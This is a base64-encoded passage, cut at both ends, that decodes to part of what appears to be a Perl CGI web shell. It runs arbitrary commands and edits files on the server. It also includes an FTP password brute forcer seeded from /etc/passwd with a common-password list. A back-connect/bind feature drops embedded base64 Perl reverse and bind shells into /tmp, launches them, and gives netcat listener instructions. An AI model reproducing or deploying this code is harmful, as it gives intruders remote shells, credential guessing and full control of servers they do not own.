b3ZpZGVzIGEgbGluawojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBEb3dubG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlCgl7CgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkKIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEV4ZWN1dGVDb21tYW5kCnsKCW15ICRyZXN1bHQ9IiI7CglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kCgl7CgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLgoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsKCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7CgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQoJCSRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIjsKCQkkcmVzdWx0IC49ICZSdW5DbWQ7Cgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQoJewoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJJHJlc3VsdCAuPSZSdW5DbWQ7Cgl9CgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBydW4gY29tbWFuZAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpzdWIgUnVuQ21kCnsKCW15ICRyZXN1bHQ9IiI7CgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7CglpZighJFdpbk5UKQoJewoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7CgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJfQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJewoJCSR8PTE7CgkJJENvbW1hbmQgLj0gIiB8IjsKCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pCgkJewoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOwoJCX0KCQkkfD0wOwoJfQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgl7CgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygnJENvbW1hbmQnKTsKCX0KCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgRm9ybSBTYXZlIEZpbGUgCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0Kc3ViIFNhdmVGaWxlRm9ybQp7CglteSAkcmVzdWx0ID0iIjsKCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOwoJbXkgJGZpbGU9JnRyaW0oJFJ1bkNvbW1hbmQpOwoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgY2xhc3M9InN1Ym1pdCIgPic7CgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsKCW15ICRkaXI9IjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiZ3VpIikuIjwvc3Bhbj4iOwoJaWYoLXcgJEZpbGUpCgl7CgkJJHJvd3M9IjIzIgoJfWVsc2UKCXsKCQkkbXNnPSI8YnI+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsnID4gUGVybWlzc2lvbiBkZW5pZWQhPGZvbnQ+PGJyPiI7CgkJJHJvd3M9IjIwIgoJfQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOwoJJHJlYWQ9KCRXaW5OVCk/InR5cGUiOiJsZXNzIjsKCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7CgkkcmVzdWx0IC49ICA8PEVORDsKCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgoKCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CgkkUHJvbXB0Cgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPgoJPGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cKCTxicj48dGV4dGFyZWEgaWQ9ImRhdGEiIG5hbWU9ImRhdGEiIGNvbHM9IiRjb2xzIiByb3dzPSIkcm93cyIgc3BlbGxjaGVjaz0iZmFsc2UiPgpFTkQKCQoJJHJlc3VsdCAuPSAmUnVuQ21kOwoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsKCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsKCXJldHVybiAkcmVzdWx0Owp9CiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBTYXZlIEZpbGUKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpzdWIgU2F2ZUZpbGUoJCkKewoJbXkgJERhdGE9IHNoaWZ0IDsKCW15ICRGaWxlPSBzaGlmdDsKCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRGaWxlOwoJaWYob3BlbihGSUxFLCAiPiRGaWxlIikpCgl7CgkJYmlubW9kZSBGSUxFOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlyZXR1cm4gMTsKCX1lbHNlCgl7CgkJcmV0dXJuIDA7Cgl9Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJydXRlIEZvcmNlciBGb3JtCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyRm9ybQp7CglteSAkcmVzdWx0PSIiOwoJJHJlc3VsdCAuPSA8PEVORDsKCjx0YWJsZT4KCjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyM8YnI+ClNpbXBsZSBGVFAgYnJ1dGUgZm9yY2VyPGJyPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4KPC90ZD4KPC90cj4KPHRyPgo8dGQ+VXNlcjo8YnI+PHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0idXNlciI+CkVORApjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOwokcmVzdWx0IC49IDw8J0VORCc7CjwvdGV4dGFyZWE+PC90ZD4KPHRkPgoKUGFzczo8YnI+Cjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MKMTIzIUAjCjEyM2FkbWluCjEyM2FiYwoxMjM0NTZhZG1pbgoxMjM0NTU0MzIxCjEyMzQ0MzIxCnBhc3MxMjMKYWRtaW4KYWRtaW5jcAphZG1pbmlzdHJhdG9yCm1hdGtoYXUKcGFzc2FkbWluCnBAc3N3b3JkCnBAc3N3MHJkCnBhc3N3b3JkCjEyMzQ1NgoxMjM0NTY3CjEyMzQ1Njc4CjEyMzQ1Njc4OQoxMjM0NTY3ODkwCjExMTExMQowMDAwMDAKMjIyMjIyCjMzMzMzMwo0NDQ0NDQKNTU1NTU1CjY2NjY2Ngo3Nzc3NzcKODg4ODg4Cjk5OTk5OQoxMjMxMjMKMjM0MjM0CjM0NTM0NQo0NTY0NTYKNTY3NTY3CjY3ODY3OAo3ODk3ODkKMTIzMzIxCjQ1NjY1NAo2NTQzMjEKNzY1NDMyMQo4NzY1NDMyMQo5ODc2NTQzMjEKMDk4NzY1NDMyMQphZG1pbjEyMwphZG1pbjEyMzQ1NgphYmNkZWYKYWJjYWJjCiFAIyFAIwohQCMkJV4KIUAjJCVeJiooCiFAIyQkI0AhCmFiYzEyMwphbmh5ZXVlbQppbG92ZXlvdTwvdGV4dGFyZWE+CjwvdGQ+CjwvdHI+Cjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4KCjxvcHRpb24+MDwvb3B0aW9uPgo8b3B0aW9uPjE8L29wdGlvbj4KPG9wdGlvbj4yPC9vcHRpb24+Cgo8b3B0aW9uPjM8L29wdGlvbj4KPC9zZWxlY3Q+IAo8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0ic3VibWl0IiB2YWx1ZT0iQnJ1dGUgRm9yY2VyIi8+PC90ZD48L3RyPgo8L2Zvcm0+CjwvdGFibGU+CkVORApyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQnJ1dGUgRm9yY2VyCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyCnsKCW15ICRyZXN1bHQ9IiI7CgkkU2VydmVyPSRFTlZ7J1NFUlZFUl9BRERSJ307CglpZigkaW57J3VzZXInfSBlcSAiIikKCXsKCQkkcmVzdWx0IC49ICZCcnV0ZUZvcmNlckZvcm07Cgl9ZWxzZQoJewoJCXVzZSBOZXQ6OkZUUDsgCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsKCQlAcGFzcz0gc3BsaXQoL1xuLywgJGlueydwYXNzJ30pOwoJCWNob21wKEB1c2VyKTsKCQljaG9tcChAcGFzcyk7CgkJJHJlc3VsdCAuPSAiPGJyPjxicj5bK10gVHJ5aW5nIGJydXRlICRTZXJ2ZXJOYW1lPGJyPj09PT09PT09PT09PT09PT09PT09Pj4+Pj4+Pj4+Pj4+PDw8PDw8PDw8PD09PT09PT09PT09PT09PT09PT09PGJyPjxicj5cbiI7CgkJZm9yZWFjaCAkdXNlcm5hbWUgKEB1c2VyKQoJCXsKCQkJaWYoISgkdXNlcm5hbWUgZXEgIiIpKQoJCQl7CgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpCgkJCQl7CgkJCQkJJGZ0cCA9IE5ldDo6RlRQLT5uZXcoJFNlcnZlcikgb3IgZGllICJDb3VsZCBub3QgY29ubmVjdCB0byAkU2VydmVyTmFtZVxuIjsgCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQoJCQkJCXsKCQkJCQkJJHJlc3VsdCAuPSAiPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2Z0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXInPlsrXSBmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyPC9hPjxicj5cbiI7CgkJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpCgkJCQkJewoJCQkJCQlzbGVlcChpbnQoJGlueydzbGVlcCd9KSk7CgkJCQkJfQoJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCX0KCQkJfQoJCX0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmFja2Nvbm5lY3QgRm9ybQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZEZvcm0KewoJcmV0dXJuIDw8RU5EOwoJPGJyPjxicj4KCgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPgoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4KCSBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNyIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjgwIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmEnKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPjwvdGQ+CgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDbGllbnQgbGlzdGVuIGJlZm9yZSBjb25uZWN0IGJhY2shCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+Cgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPgoKCTwvdHI+Cgk8L3RhYmxlPgoKCTxicj48YnI+Cgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4KCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+CgoJIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTUiIG5hbWU9ImJpbmRwYXNzIiB2YWx1ZT0iVEhJRVVHSUFCVU9OIj48L3RkPgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkJpbmQiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQoJPGJyPlsrXSBUcnkgY29tbWFuZDogPHJ1bj5uYyAkRU5WeydTRVJWRVJfQUREUid9IDxzcGFuIGlkPSJiaSI+MTQxMjwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4KCgk8L3RyPgoJPC90YWJsZT48YnI+CkVORAp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCYWNrY29ubmVjdCB1c2UgcGVybAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZAp7Cgl1c2UgTUlNRTo6QmFzZTY0OwoJdXNlIFNvY2tldDsJCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7CgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lRaElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOwoKCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307CgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7CglpZigkQ2xpZW50UG9ydCBlcSAwKQoJewoJCXJldHVybiAmQmFja0JpbmRGb3JtOwoJfWVsc2lmKCEkQ2xpZW50QWRkciBlcSAiIikKCXsKCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7CgkJaWYoLXcgIi90bXAvIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmFja2Nvbm5lY3QucGwgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsKCQl1bmxpb